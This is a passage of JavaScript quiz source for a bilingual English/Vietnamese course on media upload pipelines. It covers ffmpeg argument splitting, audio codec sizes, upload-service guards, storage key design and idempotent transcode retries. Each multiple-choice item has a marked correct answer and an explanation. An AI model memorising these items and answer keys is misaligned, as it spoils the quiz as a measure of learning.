              code("ffmpeg -i quiet.mp3 -af \"loudnorm=I=-14:TP=-1.5:LRA=11\" \":measured_I=-33.5:measured_TP=-20.0\" ...\n\nError initializing the muxer for :measured_I=-33.5:measured_TP=-20.0: Invalid argument\nError opening output file :measured_I=-33.5:measured_TP=-20.0.\nError opening output files: Invalid argument") +
              'Which fix makes this class of bug <em>unrepresentable</em> rather than merely fixed?',
            'Một tính năng độ to chạy ba lượt ffmpeg cho mỗi bài, ghi một dòng <code>warn</code>, và trả về thành công — trong khi mọi bài ra đều chưa được chuẩn hoá. Chuỗi bộ lọc đã được ghép bằng cách <code>.join(\' \')</code> hai phần tử mảng. Đúng chỗ tách đó đã được tái hiện:' +
              code("ffmpeg -i quiet.mp3 -af \"loudnorm=I=-14:TP=-1.5:LRA=11\" \":measured_I=-33.5:measured_TP=-20.0\" ...\n\nError initializing the muxer for :measured_I=-33.5:measured_TP=-20.0: Invalid argument\nError opening output file :measured_I=-33.5:measured_TP=-20.0.\nError opening output files: Invalid argument") +
              'Cách vá nào làm cho LỚP bug này trở nên KHÔNG BIỂU DIỄN ĐƯỢC, chứ không chỉ là được vá?',
          ),
          options: [
            B(
              'Escape the filter string before interpolating it, so a stray space inside a value cannot end an argument. A single <code>shell-quote</code> call at the join site removes the whole class, because the space is then part of the value rather than a separator.',
              'Escape chuỗi bộ lọc trước khi nội suy nó vào, để một khoảng trắng lạc trong một giá trị không kết thúc được một tham số. Một lời gọi <code>shell-quote</code> duy nhất ở chỗ ghép sẽ xoá cả lớp bug, vì khi đó khoảng trắng là một phần của giá trị chứ không phải một dấu ngăn.',
            ),
            B(
              'Remove the fallback <code>catch</code> so the failure propagates. The bug was invisible because a broken pass 2 was converted into a successful re-encode; with the fallback gone, the very first track would have failed loudly and the space would have been found in minutes.',
              'Bỏ khối <code>catch</code> dự phòng đi để lỗi lan ra ngoài. Bug vô hình vì một lượt 2 hỏng đã bị biến thành một lượt encode lại thành công; bỏ đường dự phòng đi thì bài đầu tiên đã hỏng ầm ĩ và cái khoảng trắng đã được tìm ra trong vài phút.',
            ),
            B(
              'Validate the assembled command with a regular expression before running it, asserting that <code>-af</code> is followed by exactly one token and that the token contains every <code>measured_*</code> key. A guard at the call site catches the split regardless of how the string was built.',
              'Kiểm tra câu lệnh đã ghép bằng một biểu thức chính quy trước khi chạy, khẳng định rằng <code>-af</code> được theo sau bởi đúng một token và token đó chứa đủ mọi khoá <code>measured_*</code>. Một chốt chặn ở chỗ gọi sẽ bắt được chỗ tách bất kể chuỗi được dựng thế nào.',
            ),
            B(
              'Pass an argv array to <code>execFile</code>/<code>spawn</code>. In a command <em>string</em> the boundary between arguments is a space, and spaces also live inside filter graphs, values and filenames, so the argument structure is invisible when you read the code. In an argv <em>array</em> the boundary is a comma, so <code>[\'-af\', \'loudnorm=…\', \':measured_I=…\']</code> is visibly three arguments and <code>[\'-af\', \'loudnorm=…:measured_I=…\']</code> is visibly two. Reviewers catch the first shape instantly; nobody catches a missing space at the end of line 2 of a 7-line array.',
              'Truyền một mảng argv cho <code>execFile</code>/<code>spawn</code>. Trong một CHUỖI lệnh, ranh giới giữa các tham số là một khoảng trắng, mà khoảng trắng cũng sống bên trong các đồ thị bộ lọc, các giá trị và các tên file, nên cấu trúc tham số là VÔ HÌNH khi bạn đọc mã. Trong một MẢNG argv, ranh giới là dấu phẩy, nên <code>[\'-af\', \'loudnorm=…\', \':measured_I=…\']</code> nhìn rõ là ba tham số còn <code>[\'-af\', \'loudnorm=…:measured_I=…\']</code> nhìn rõ là hai. Người review bắt được hình dạng thứ nhất ngay lập tức; không ai bắt được một khoảng trắng thiếu ở cuối dòng 2 của một mảng bảy dòng.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Concatenating the filter with <code>+</code> instead of <code>.join(\' \')</code> fixes today\'s defect. Moving to an argv array fixes the <em>category</em>, and that is the difference the question is asking about. In a shell string the argument boundary is a space and spaces are also ordinary characters inside values, so you cannot see the structure by reading; a missing space silently merges two arguments and an extra one silently splits one. In an array each element is one argument by construction, so the mistake cannot be written. The reproduction above is worth reading closely: ffmpeg took the orphaned fragment as a positional argument, which in its grammar is an output URL, and reported <code>Error initializing the muxer for :measured_I=…: Invalid argument</code> — note that this is ffmpeg 8.1.2\'s wording, not the <code>Unable to find a suitable output format</code> the course text quotes. Option 1 solves a problem that does not exist here; nothing was quoted wrongly, the string was simply split. Option 2 is a genuinely good complementary change and is the subject of Chapter 9 — but removing a fallback that exists so a bad encode does not fail an upload trades one bug for another; the right version is to <em>count</em> the fallback. Option 3 is a validator for one command shape that will drift out of date the moment the filter changes.',
            'Nối chuỗi bộ lọc bằng <code>+</code> thay vì <code>.join(\' \')</code> vá được khiếm khuyết của hôm nay. Chuyển sang một mảng argv thì vá được cả LOẠI, và đó chính là khác biệt mà câu hỏi đang nhắm tới. Trong một chuỗi shell, ranh giới tham số là một khoảng trắng mà khoảng trắng cũng là ký tự bình thường bên trong các giá trị, nên bạn không THẤY được cấu trúc khi đọc; một khoảng trắng thiếu âm thầm gộp hai tham số và một khoảng trắng thừa âm thầm tách một tham số. Trong một mảng thì theo cấu tạo mỗi phần tử là một tham số, nên cái lỗi ấy không viết ra được. Phần tái hiện ở trên đáng đọc kỹ: ffmpeg nhận mẩu bị bỏ rơi như một tham số vị trí, mà trong ngữ pháp của nó thì đó là một URL output, và nó báo <code>Error initializing the muxer for :measured_I=…: Invalid argument</code> — lưu ý đây là cách diễn đạt của ffmpeg 8.1.2, không phải câu <code>Unable to find a suitable output format</code> mà lời văn giáo trình trích. Phương án 1 giải một vấn đề không tồn tại ở đây; không có gì bị đặt nháy sai cả, chuỗi chỉ đơn giản là bị tách. Phương án 2 là một thay đổi bổ trợ thật sự tốt và là chủ đề của Chương 9 — nhưng bỏ một đường dự phòng vốn tồn tại để một lượt encode tồi không làm hỏng một lượt upload là đánh đổi bug này lấy bug khác; bản đúng là hãy ĐẾM đường dự phòng đó. Phương án 3 là một bộ kiểm cho đúng một hình dạng lệnh, và nó sẽ lạc hậu ngay khi bộ lọc thay đổi.',
          ),
        }),

        // q30 · đáp án 1
        mcq({
          prompt: B(
            'The same 8-second speech-like recording was encoded several ways:' +
              code("wav 16k mono pcm_s16le    256078 B\nlibopus @16k               15016 B\nlibopus @24k               22542 B\nlibmp3lame @64k            65133 B\naac @64k                   65487 B\nlibopus @128k             121181 B") +
              'You are choosing a format for voice notes in a chat app. Which reading is correct?',
            'Cùng một bản thu giống-tiếng-nói dài 8 giây được encode theo vài cách:' +
              code("wav 16k mono pcm_s16le    256078 B\nlibopus @16k               15016 B\nlibopus @24k               22542 B\nlibmp3lame @64k            65133 B\naac @64k                   65487 B\nlibopus @128k             121181 B") +
              'Bạn đang chọn định dạng cho tin nhắn thoại trong một app chat. Cách đọc nào đúng?',
          ),
          options: [
            B(
              'Opus at 128 kbps, since it is the only row that beats the WAV by less than an order of magnitude and therefore the only one preserving enough of the original signal for speech recognition to work on it later.',
              'Opus ở 128 kbps, vì đó là dòng duy nhất chỉ nhỏ hơn bản WAV chưa tới một bậc độ lớn và do đó là dòng duy nhất giữ đủ tín hiệu gốc để nhận dạng tiếng nói còn chạy được trên nó về sau.',
            ),
            B(
              'Opus at 24 kbps: 22,542 bytes against 65,133 for MP3 at 64 kbps — roughly a third of the bytes at a bitrate where Opus is transparent for voice, because it was designed for speech and switches to a speech-optimised mode internally. Compressed size is <code>bitrate × duration</code>, so the codec choice and the bitrate choice are the whole decision; sample rate and channels are already folded into it.',
              'Opus ở 24 kbps: 22.542 byte so với 65.133 của MP3 ở 64 kbps — khoảng một phần ba số byte ở một mức bitrate mà Opus trong suốt với giọng nói, vì nó được thiết kế cho tiếng nói và tự chuyển sang chế độ tối ưu cho giọng ở bên trong. Kích thước sau nén là <code>bitrate × thời lượng</code>, nên chọn codec và chọn bitrate là toàn bộ quyết định; tần số lấy mẫu và số kênh đã được gấp sẵn vào trong đó.',
            ),
            B(
              'AAC at 64 kbps, because it is within 400 bytes of the MP3 at the same bitrate, which proves the two are interchangeable, and AAC is the one that can be muxed into an MP4 alongside video without a second encode.',
              'AAC ở 64 kbps, vì nó chỉ chênh MP3 cùng bitrate 400 byte, chứng tỏ hai cái thay thế được cho nhau, và AAC là cái mux được vào một MP4 cạnh video mà không cần một lượt encode thứ hai.',
            ),
            B(
              'The WAV, because every compressed row is lossy and a voice note is short enough that 256 KB is negligible; storing the original avoids a generational loss the moment somebody forwards the message and it is re-encoded.',
              'Bản WAV, vì mọi dòng đã nén đều mất dữ liệu và một tin nhắn thoại đủ ngắn để 256 KB là không đáng kể; lưu bản gốc tránh được mất mát qua thế hệ ngay khi có người chuyển tiếp tin nhắn và nó bị encode lại.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The table is arithmetic once you know the rule. For compressed audio, size is bitrate times duration and nothing else — 24 kbps × 8 s ÷ 8 = 24,000 bytes, measured 22,542; 64 kbps × 8 s ÷ 8 = 64,000 bytes, measured 65,133 for MP3 and 65,487 for AAC. Channels and sample rate are already inside the bitrate, which is why the compressed rows do not need a channel column. What the table shows beyond the formula is that codec choice moves the goalposts: Opus at 24 kbps is a third the size of MP3 at 64 kbps, and on voice it is the better of the two, because Opus contains a speech-optimised mode it switches into automatically. Option 1 has the relationship backwards — recognisers want the sample rate and the intelligible band, not the bitrate, and 16 kHz mono is precisely what they ask for. Option 3 is right that AAC muxes into MP4 conveniently, which matters for video, but for a standalone voice note it is spending 65 KB where 22 KB sounds the same. Option 4 sounds prudent and multiplies your storage by eleven; the answer to generational loss is to keep the compressed original and not re-encode on forward.',
            'Cái bảng này là phép tính số học một khi bạn biết quy tắc. Với âm thanh đã nén, kích thước bằng bitrate nhân thời lượng và không gì khác — 24 kbps × 8 s ÷ 8 = 24.000 byte, đo được 22.542; 64 kbps × 8 s ÷ 8 = 64.000 byte, đo được 65.133 với MP3 và 65.487 với AAC. Số kênh và tần số lấy mẫu đã nằm sẵn trong bitrate, và đó là lý do các dòng đã nén không cần một cột số kênh. Thứ mà cái bảng cho thấy vượt ra ngoài công thức là việc CHỌN CODEC dời hẳn cột mốc: Opus ở 24 kbps chỉ bằng một phần ba MP3 ở 64 kbps, và trên giọng nói thì nó là cái hay hơn trong hai, vì Opus có sẵn một chế độ tối ưu cho tiếng nói mà nó tự chuyển sang. Phương án 1 lộn ngược quan hệ — các bộ nhận dạng cần tần số lấy mẫu và dải tần nghe hiểu được, không cần bitrate, và 16 kHz mono đúng là thứ chúng đòi. Phương án 3 nói đúng rằng AAC mux vào MP4 tiện lợi, điều đó quan trọng với video, nhưng với một tin nhắn thoại độc lập thì nó đang tiêu 65 KB ở chỗ 22 KB nghe y hệt. Phương án 4 nghe thận trọng và nhân dung lượng của bạn lên mười một lần; câu trả lời cho mất mát qua thế hệ là giữ nguyên bản đã nén và đừng encode lại khi chuyển tiếp.',
          ),
        }),

        /* ── Chương 5 — đường ống upload (5 câu) ──────────────────────────── */

        // q31 · đáp án 2
        mcq({
          prompt: B(
            'A new route calls <code>sharp()</code> and <code>provider.put()</code> directly instead of going through <code>uploadImage()</code>. Everything works in review and in staging. What is the actual risk profile?',
            'Một route mới gọi thẳng <code>sharp()</code> và <code>provider.put()</code> thay vì đi qua <code>uploadImage()</code>. Mọi thứ chạy tốt lúc review và trên staging. Hồ sơ rủi ro thật sự là gì?',
          ),
          options: [
            B(
              'Low: Sharp applies sensible defaults for pixel limits and orientation, and the storage provider derives a content type from the buffer, so the bypass costs you the savings log line and nothing else of substance, and the concurrency gate is a libvips-level default in any case.',
              'Thấp: Sharp áp các mặc định hợp lý cho giới hạn pixel và hướng xoay, còn provider lưu trữ thì suy loại nội dung từ chính buffer, nên việc đi vòng chỉ khiến bạn mất dòng log tiết kiệm và không mất gì đáng kể khác, còn cổng concurrency thì dù sao cũng là một mặc định ở tầng libvips.',
            ),
            B(
              'Moderate but bounded: the route inherits every guard that lives in middleware — multer\'s size limit and the MIME allowlist — and only loses the ones implemented inside the service, which are the WebP re-encode and the key layout. The remaining loss is therefore cosmetic rather than structural.',
              'Vừa phải nhưng có giới hạn: route đó vẫn thừa hưởng mọi chốt chặn nằm ở middleware — giới hạn kích thước của multer và danh sách MIME cho phép — và chỉ mất những chốt chặn cài bên trong service, tức là lượt re-encode WebP và bố cục key. Phần mất còn lại vì thế là chuyện hình thức chứ không phải cấu trúc.',
            ),
            B(
              'It silently re-opens every guard the previous chapters installed, but only on that one route: no pixel budget and no concurrency gate (so the decompression bomb works again there), no EXIF rotation, no SVG rejection, no <code>u&lt;id&gt;</code> ownership segment in the key, and a key derived from the input extension so WebP bytes get served as <code>image/png</code>. Each is invisible everywhere you tested, which is what makes it hard to find — enforce the rule with a CI grep rather than a review convention.',
              'Nó âm thầm mở lại mọi chốt chặn mà các chương trước đã lắp, nhưng chỉ trên đúng route đó: không ngân sách pixel và không cổng concurrency (nên quả bom giải nén hoạt động trở lại ở đấy), không xoay EXIF, không từ chối SVG, không đoạn quyền sở hữu <code>u&lt;id&gt;</code> trong key, và một key suy từ đuôi file đầu vào nên byte WebP bị phục vụ dưới dạng <code>image/png</code>. Mỗi cái đều vô hình ở mọi chỗ bạn đã thử, và đó là điều làm nó khó tìm — hãy thi hành quy tắc bằng một lệnh grep trong CI thay vì bằng một quy ước lúc review.',
            ),
            B(
              'It will fail at build time, because the storage provider interface is only exported to <code>src/storage/</code> and TypeScript rejects the import from a route module; the bypass is therefore prevented by construction and needs no separate enforcement, and any attempt to widen that export would surface in review.',
              'Nó sẽ hỏng lúc build, vì interface của storage provider chỉ được export cho <code>src/storage/</code> và TypeScript từ chối lượt import từ một module route; việc đi vòng vì thế bị chặn ngay từ cấu tạo và không cần thi hành gì thêm, còn mọi nỗ lực nới rộng lượt export đó đều sẽ lộ ra lúc review.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The single-door architecture exists precisely because guards are not portable. Chapters 1 through 4 produced a list of them — a pixel budget that counts frames, a concurrency gate, argument-less <code>.rotate()</code>, an SVG rejection at two gates, keys built from the output format with an owner segment — and every one of them lives in code that a bypassing route does not execute. The result is a set of bugs scoped to one endpoint, which is the hardest scope to find: the feature works everywhere you looked, the tests pass because they exercise the main path, and the vulnerability is reachable only through a URL nobody thought to re-audit. Enforcement has to be mechanical, which is why the lesson suggests two greps in CI: no <code>sharp</code> import outside <code>src/storage/</code>, and no <code>getStorageProvider().put</code> outside the upload service. When a new caller genuinely needs different behaviour, the fix is a new function <em>in</em> the service. Option 1 is wrong on both defaults — Sharp\'s own pixel limit is 268 megapixels, high enough to let the bomb through, and it strips rather than applies EXIF orientation. Option 2 misplaces the guards; the pixel budget and the SVG rejection are in the service, not in middleware. Option 4 describes a module boundary the language does not enforce.',
            'Kiến trúc một-cửa tồn tại chính vì các chốt chặn không mang theo được. Chương 1 tới 4 đã sinh ra một danh sách chốt chặn — một ngân sách pixel biết đếm frame, một cổng concurrency, <code>.rotate()</code> không tham số, một phép từ chối SVG ở hai cổng, những key dựng từ format output kèm đoạn chủ sở hữu — và mọi chốt chặn đó đều sống trong đoạn mã mà một route đi vòng KHÔNG chạy tới. Kết quả là một bộ bug chỉ có phạm vi một endpoint, và đó là phạm vi khó tìm nhất: tính năng chạy tốt ở mọi chỗ bạn nhìn, các bài test đều qua vì chúng đi đường chính, và lỗ hổng chỉ với tới được qua một URL không ai nghĩ tới việc rà lại. Việc thi hành phải mang tính máy móc, và đó là lý do bài học đề nghị hai lệnh grep trong CI: không import <code>sharp</code> ngoài <code>src/storage/</code>, và không <code>getStorageProvider().put</code> ngoài upload service. Khi một người gọi mới thật sự cần hành vi khác, cách vá là thêm một hàm mới VÀO service. Phương án 1 sai ở cả hai mặc định — giới hạn pixel của chính Sharp là 268 megapixel, đủ cao để quả bom lọt qua, và nó BÓC chứ không ÁP hướng xoay EXIF. Phương án 2 đặt sai vị trí các chốt chặn; ngân sách pixel và phép từ chối SVG nằm trong service chứ không nằm ở middleware. Phương án 4 mô tả một ranh giới module mà ngôn ngữ không thi hành.',
          ),
        }),

        // q32 · đáp án 0
        mcq({
          prompt: B(
            'The upload service builds its key from the <em>output</em> format rather than the input filename:' +
              code("input.originalName = \"Ảnh chụp màn hình 2026-08-24 lúc 14.32.07.png\"\nkey                = \"images/posts/u42/1735689600000-a3f9c2b17e4d.webp\"") +
              'Which single consequence of keeping the <code>.png</code> extension would break a working page?',
            'Upload service dựng key từ format ĐẦU RA chứ không từ tên file đầu vào:' +
              code("input.originalName = \"Ảnh chụp màn hình 2026-08-24 lúc 14.32.07.png\"\nkey                = \"images/posts/u42/1735689600000-a3f9c2b17e4d.webp\"") +
              'Hệ quả duy nhất nào của việc giữ lại đuôi <code>.png</code> sẽ làm hỏng một trang vốn đang chạy?',
          ),
          options: [
            B(
              'The stored object would be served with <code>Content-Type: image/png</code> while holding WebP bytes, because the content type is derived from the key\'s extension. It renders in permissive browsers and fails in strict clients, and <code>curl -I</code> on the URL is what exposes it — a mismatch between the declared type and the actual bytes, invisible until something checks.',
              'Object được lưu sẽ được phục vụ với <code>Content-Type: image/png</code> trong khi chứa byte WebP, vì loại nội dung được suy từ đuôi của key. Nó dựng được ở các trình duyệt dễ tính và hỏng ở các client nghiêm ngặt, và <code>curl -I</code> lên cái URL đó là thứ phơi bày ra — một sự lệch giữa loại khai báo và byte thật, vô hình cho tới khi có thứ gì đó đi kiểm.',
            ),
            B(
              'Object storage would reject the <code>PUT</code>, because S3-compatible services validate that the declared extension matches the uploaded bytes and return <code>400 InvalidObjectState</code> for a mismatch.',
              'Kho lưu trữ object sẽ từ chối lượt <code>PUT</code>, vì các dịch vụ tương thích S3 kiểm tra rằng đuôi khai báo khớp với byte được upload và trả về <code>400 InvalidObjectState</code> khi lệch.',
            ),
            B(
              'The CDN would refuse to cache the object, since a cache key is derived from the extension and an extension that disagrees with the payload produces an unstable hash on revalidation.',
              'CDN sẽ từ chối cache object đó, vì khoá cache được suy từ đuôi file và một cái đuôi bất đồng với phần payload sẽ tạo ra một mã băm không ổn định lúc kiểm tra lại.',
            ),
            B(
              'Sharp would refuse to re-read its own output later, because <code>metadata()</code> dispatches on the extension when the input is a path and would try the PNG decoder on WebP bytes.',
              'Sharp sẽ từ chối đọc lại chính output của nó về sau, vì <code>metadata()</code> phân nhánh theo đuôi file khi đầu vào là một đường dẫn và sẽ thử bộ giải mã PNG trên byte WebP.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The key is not decoration; it is what the serving layer reads to decide the response headers. Store WebP bytes under a <code>.png</code> key and every request for that object announces <code>image/png</code>. Most browsers sniff and render it anyway, which is what makes the bug survive: it works on your machine, and it fails in the places that follow the header — some native clients, some image proxies, some email renderers, anything with a strict content-type check. The diagnosis is one command, and it is in Chapter 9\'s table for exactly this reason: <code>curl -I</code> the URL and compare <code>Content-Type</code> against what the bytes actually are. The rule that avoids it is stated in the upload service as a comment: always store the optimised output under a fresh key carrying the output format\'s extension, never one derived from the input\'s. Option 2 invents a validation that object stores do not perform; they store bytes under a key and echo whatever content type you set. Option 3 invents a cache-key rule; CDNs key on the URL, and an extension mismatch is irrelevant to caching. Option 4 is wrong about Sharp, which sniffs magic bytes and ignores the extension entirely.',
            'Cái key không phải đồ trang trí; nó là thứ mà tầng phục vụ đọc để quyết định các header của phản hồi. Lưu byte WebP dưới một key <code>.png</code> thì mọi lượt yêu cầu object đó đều tuyên bố <code>image/png</code>. Hầu hết trình duyệt vẫn đánh hơi rồi dựng ra được, và đó là cái làm bug sống dai: nó chạy trên máy bạn, và nó hỏng ở những nơi tuân theo header — một số client native, một số image proxy, một số bộ dựng email, bất cứ thứ gì kiểm loại nội dung nghiêm ngặt. Chẩn đoán chỉ tốn một lệnh, và nó nằm trong bảng của Chương 9 đúng vì lý do này: <code>curl -I</code> cái URL rồi so <code>Content-Type</code> với thứ mà các byte thật sự là. Quy tắc né được nó được ghi ngay trong upload service dưới dạng một comment: luôn lưu output đã tối ưu dưới một key mới mang đuôi của FORMAT ĐẦU RA, không bao giờ dùng cái suy từ đầu vào. Phương án 2 bịa ra một phép kiểm mà các kho object không thực hiện; chúng lưu byte dưới một key và lặp lại đúng loại nội dung bạn đặt. Phương án 3 bịa ra một quy tắc khoá cache; CDN khoá theo URL, và đuôi file lệch thì không liên quan gì tới việc cache. Phương án 4 sai về Sharp, vốn đánh hơi magic byte và phớt lờ hoàn toàn cái đuôi.',
          ),
        }),

        // q33 · đáp án 0
        mcq({
          prompt: B(
            'A key builder discards the uploader\'s filename entirely and produces <code>images/posts/u42/1735689600000-a3f9c2b17e4d.webp</code>. A reviewer wants the original name back "so downloads look right". What do you lose, and where does the name belong?',
            'Một bộ dựng key vứt bỏ hoàn toàn tên file của người upload và sinh ra <code>images/posts/u42/1735689600000-a3f9c2b17e4d.webp</code>. Một người review muốn lấy lại tên gốc "cho tải xuống nhìn cho đúng". Bạn mất gì, và cái tên đó thuộc về đâu?',
          ),
          options: [
            B(
              'You lose four separate protections: no shell or path metacharacter can reach a key (which is the exact route the Chapter 3 injection travelled), no NFC-versus-NFD unicode lookup problem, no information disclosure through a public URL — "Hợp đồng lương Nguyễn Văn A.pdf" leaks its own contents to anyone who sees the link — and no collision between two users uploading "avatar.png". Store the original name in a database column and apply it at download time with <code>Content-Disposition: attachment; filename*=UTF-8\'\'…</code>.',
              'Bạn mất bốn lớp bảo vệ riêng biệt: không ký tự đặc biệt của shell hay đường dẫn nào tới được một key (đúng con đường mà vụ injection ở Chương 3 đã đi), không có vấn đề tra cứu unicode NFC-so-với-NFD, không rò rỉ thông tin qua một URL công khai — "Hợp đồng lương Nguyễn Văn A.pdf" tự tiết lộ nội dung của chính nó cho bất cứ ai thấy cái link — và không đụng độ giữa hai người cùng upload "avatar.png". Hãy lưu tên gốc vào một cột cơ sở dữ liệu rồi áp nó lúc tải xuống bằng <code>Content-Disposition: attachment; filename*=UTF-8\'\'…</code>.',
            ),
            B(
              'You lose only readability in the bucket listing. The other concerns are handled elsewhere — the upload gate already rejects dangerous extensions, and object stores normalise unicode on write — so restoring the name is safe as long as you keep the random suffix for collisions.',
              'Bạn chỉ mất tính dễ đọc khi liệt kê bucket. Những mối lo còn lại đã được xử lý ở chỗ khác — cổng upload vốn đã loại các đuôi nguy hiểm, và các kho object thì chuẩn hoá unicode lúc ghi — nên khôi phục cái tên là an toàn miễn là bạn giữ phần hậu tố ngẫu nhiên để tránh đụng độ.',
            ),
            B(
              'You lose the ability to sort the bucket chronologically, since a name-prefixed key sorts alphabetically instead. That is the only real cost, and it is recovered by keeping the timestamp as the first component and the name as the last.',
              'Bạn mất khả năng sắp xếp bucket theo thời gian, vì một key có tên đứng trước sẽ sắp theo bảng chữ cái. Đó là chi phí thật duy nhất, và nó lấy lại được bằng cách giữ dấu thời gian làm thành phần đầu và cái tên làm thành phần cuối.',
            ),
            B(
              'You lose nothing important, because the <code>u42</code> segment already scopes every key to its owner. Ownership is what the four rules protect, and once a key cannot be reached by another user the contents of the name stop mattering.',
              'Bạn không mất gì quan trọng, vì đoạn <code>u42</code> vốn đã giới hạn mọi key theo chủ sở hữu của nó. Quyền sở hữu mới là thứ bốn quy tắc kia bảo vệ, và một khi một key không bị người dùng khác với tới được thì nội dung của cái tên thôi quan trọng.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Four independent reasons, and the instinct to keep the friendly name is strong enough that they are worth naming individually. First, the security one: Chapter 3\'s command injection travelled from <code>req.file.originalname</code> into a filesystem path into a shell string — remove the name from the path and the whole route disappears. Second, unicode: "Ảnh" has two valid encodings (NFC and NFD) that compare unequal, so a key containing it is a key you cannot reliably look up again. Third, disclosure: a public URL is readable by anyone who receives it, and a filename is often the most sensitive metadata a document has. Fourth, collisions between users. The friendly download name is a real requirement and it is satisfied at the other end: store it in a column and set it at serve time with the RFC 5987 form <code>filename*=UTF-8\'\'</code>, which is what makes non-ASCII names survive — plain <code>filename=</code> with UTF-8 bytes produces mojibake in several browsers. Option 2 is wrong on both claims: the dangerous-extension regex is anchored and matches only the end of a name, and object stores do not normalise unicode. Option 3 identifies a real ordering property but treats it as the only cost. Option 4 confuses access control with the four problems above, none of which is about another user reaching the key.',
            'Bốn lý do độc lập, và bản năng muốn giữ cái tên thân thiện mạnh tới mức đáng nêu từng cái ra. Thứ nhất, lý do bảo mật: vụ command injection ở Chương 3 đi từ <code>req.file.originalname</code> vào một đường dẫn hệ thống file rồi vào một chuỗi shell — bỏ cái tên ra khỏi đường dẫn thì cả con đường đó biến mất. Thứ hai, unicode: chữ "Ảnh" có hai cách mã hoá hợp lệ (NFC và NFD) so sánh ra không bằng nhau, nên một key chứa nó là một key bạn không tra cứu lại được một cách đáng tin. Thứ ba, rò rỉ: một URL công khai thì ai nhận được cũng đọc được, và tên file thường là mẩu siêu dữ liệu nhạy cảm nhất mà một tài liệu có. Thứ tư, đụng độ giữa những người dùng. Cái tên tải xuống thân thiện là một yêu cầu có thật và nó được thoả mãn ở đầu bên kia: lưu nó vào một cột rồi đặt lúc phục vụ bằng dạng RFC 5987 <code>filename*=UTF-8\'\'</code>, đó chính là thứ giúp các tên non-ASCII sống sót — <code>filename=</code> thường với byte UTF-8 sinh ra chữ loạn trên vài trình duyệt. Phương án 2 sai ở cả hai khẳng định: biểu thức đuôi nguy hiểm có neo và chỉ khớp phần cuối một cái tên, còn các kho object thì không chuẩn hoá unicode. Phương án 3 nhận ra một tính chất sắp xếp có thật nhưng coi nó là chi phí duy nhất. Phương án 4 lẫn kiểm soát truy cập với bốn vấn đề ở trên, mà không vấn đề nào trong đó nói về việc một người dùng khác với tới cái key.',
          ),
        }),

        // q34 · đáp án 3
        mcq({
          prompt: B(
            'A transcode worker names its output variants by calling the same <code>buildKey()</code> the upload path uses — the one that embeds <code>Date.now()</code> and <code>crypto.randomBytes(6)</code>. The queue redelivers the job after a worker crash. What happens?',
            'Một worker transcode đặt tên cho các variant đầu ra bằng cách gọi đúng hàm <code>buildKey()</code> mà đường upload dùng — hàm nhúng <code>Date.now()</code> và <code>crypto.randomBytes(6)</code>. Hàng đợi giao lại job sau khi một worker chết. Chuyện gì xảy ra?',
          ),
          options: [
            B(
              'The second run collides with the first on the timestamp component and overwrites it, so the outcome is correct but the write is wasted; adding a millisecond of jitter before the retry avoids even that.',
              'Lượt chạy thứ hai đụng độ với lượt đầu ở thành phần dấu thời gian rồi ghi đè lên, nên kết quả thì đúng còn lượt ghi thì lãng phí; thêm một mili giây xê dịch trước khi retry là né được cả điều đó.',
            ),
            B(
              'The job fails with a duplicate-key error from object storage, which is the queue\'s intended signal that the work was already done; the retry is then marked complete and no cleanup is needed.',
              'Job thất bại với một lỗi trùng key từ kho object, và đó chính là tín hiệu mà hàng đợi mong đợi để biết việc đã được làm rồi; lượt retry khi đó được đánh dấu hoàn tất và không cần dọn dẹp gì.',
            ),
            B(
              'Nothing — the queue guarantees exactly-once delivery for jobs whose handler is registered as idempotent, so a redelivery after a crash cannot produce a second execution of the same job payload.',
              'Không có gì — hàng đợi bảo đảm giao ĐÚNG MỘT LẦN với những job có handler được đăng ký là idempotent, nên một lượt giao lại sau khi chết không thể sinh ra lần thực thi thứ hai của cùng payload.',
            ),
            B(
              'The retry writes a whole second set of variants under fresh, different keys. The database row is updated to point at the newest set, and the first set becomes orphans that no cleanup job knows about — invisible storage growth. Worker outputs must be derived <em>deterministically</em> from the input key, so a redelivery overwrites rather than duplicates.',
              'Lượt retry ghi ra nguyên một bộ variant THỨ HAI dưới những key mới, khác hẳn. Dòng cơ sở dữ liệu được cập nhật để trỏ vào bộ mới nhất, và bộ đầu tiên trở thành mồ côi mà không job dọn dẹp nào biết tới — dung lượng phình lên một cách vô hình. Output của worker phải được suy TẤT ĐỊNH từ key đầu vào, để một lượt giao lại GHI ĐÈ chứ không nhân đôi.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The key builder is deliberately non-deterministic, and that is exactly right for user uploads: a timestamp plus six random bytes means two simultaneous uploads cannot collide and neighbouring keys cannot be guessed by incrementing. Inside a retryable job the same property is a defect. Every queue worth using is at-least-once — worker crashes, visibility timeouts and mid-job deploys all redeliver — so a handler that generates fresh keys on every run produces a fresh complete set of outputs on every run. The row points at the last one, and the earlier sets are unreachable from any code path: they are Orphan A, storage you pay for forever with nothing referencing it. Deriving the output key from the input key (<code>row.r2Key</code> with the extension replaced and a rung suffix appended) makes the second run write the same bytes to the same place, which is harmless. Pair it with a status check at the top of the handler — <code>if (row.status === \'READY\') return</code> — which costs one query and turns a duplicate delivery into a no-op. Option 1 is arithmetically wrong: <code>Date.now()</code> differs across a crash-and-retry by seconds, and the random suffix differs regardless. Option 2 invents a constraint object stores do not have; a <code>PUT</code> to an existing key overwrites. Option 3 describes a guarantee no practical queue offers.',
